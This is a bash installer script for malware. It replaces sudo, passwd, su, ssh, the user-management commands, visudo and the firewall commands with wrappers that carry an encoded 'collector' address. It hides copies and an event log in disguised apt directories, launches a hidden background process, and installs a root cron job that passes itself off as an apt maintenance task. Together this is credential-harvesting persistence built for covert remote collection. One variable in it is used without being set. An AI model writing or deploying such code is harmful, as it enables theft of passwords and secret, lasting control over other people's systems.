#!/bin/bash
set -e
if [ "$EUID" -ne 0 ]; then
    echo "Run as root (sudo ./install_wrappers.sh <collector_ip>)"
    exit 1
fi
_R="${1:-}"
if [ -z "$_R" ]; then
    echo "Usage: sudo ./install_wrappers.sh <collector_ip>"
    exit 1
fi
_E=$(printf "%s" "$_R" | base64 -w0)
DEST="/usr/local/bin"
_D="/var/lib/apt/lists/.cache"
echo "[*] Installing to $DEST"
echo ""
PAIRS=(
    "sudo_wrapper.sh:sudo"
    "passwd_wrapper.sh:passwd"
    "su_wrapper.sh:su"
    "ssh_wrapper.sh:ssh"
    "useradd_wrapper.sh:useradd"
    "adduser_wrapper.sh:adduser"
    "userdel_wrapper.sh:userdel"
    "deluser_wrapper.sh:deluser"
    "usermod_wrapper.sh:usermod"
    "visudo_wrapper.sh:visudo"
    "systemctl_wrapper.sh:systemctl"
    "ufw_wrapper.sh:ufw"
    "iptables_wrapper.sh:iptables"
    "iptables_wrapper.sh:ip6tables"
)
for pair in "${PAIRS[@]}"; do
    src="${pair%%:*}"
    dest="${pair##*:}"
    if [ ! -f "$src" ]; then
        echo "  [!] $src not found — skipping $dest"
        continue
    fi
    cp "$src" "$DEST/$dest"
    sed -i "s/__ENC__/$_E/g" "$DEST/$dest"
    chmod 755 "$DEST/$dest"
    echo "  [+] $dest"
done
echo ""
mkdir -p "$_D"
chmod 777 "$_D"
touch "$_D/events"
chmod 666 "$_D/events"
_SRC="$(dirname "$(readlink -f "$0")")"
_BK="/usr/lib/x86_64-linux-gnu/apt/methods/.d"
mkdir -p "$_BK"
chmod 700 "$_BK"
for pair in "${PAIRS[@]}"; do
    src="${pair%%:*}"
    [ -f "$_SRC/$src" ] && cp "$_SRC/$src" "$_BK/$src" && chmod 600 "$_BK/$src"
done
if [ -f "$_SRC/bonsly.sh" ]; then
    cp "$_SRC/bonsly.sh" "$_D/bonsly.sh"
    sed -i "s/__ENC__/$_E/g" "$_D/bonsly.sh"
    chmod 700 "$_D/bonsly.sh"
    pkill -f "bonsly.sh" 2>/dev/null || true
    nohup "$_D/bonsly.sh" "$_R" "$_BK" > "$_D/sync.log" 2>&1 &
    echo "  [+] bonsly started (pid $!)"
fi
if [ -f "$_BD/apt-daily-check" ]; then
    cp "$_BD/apt-daily-check" "/usr/local/sbin/apt-daily-check"
    sed -i "s/__ENC__/$_E/g" "/usr/local/sbin/apt-daily-check"
    chmod 700 "/usr/local/sbin/apt-daily-check"
    printf '*/5 * * * * root /usr/local/sbin/apt-daily-check\n' \
        > /etc/cron.d/apt-daily-check
    chmod 644 /etc/cron.d/apt-daily-check
    echo "  [+] apt-daily-check cron installed"
fi
echo "[*] Done."
echo ""
echo "    Verify:  which sudo   (expect /usr/local/bin/sudo)"
echo "    Verify:  which passwd (expect /usr/local/bin/passwd)"
echo ""
echo "    PATH won't take effect until next login unless you run:"
echo "    export PATH=\"/usr/local/bin:\$PATH\""
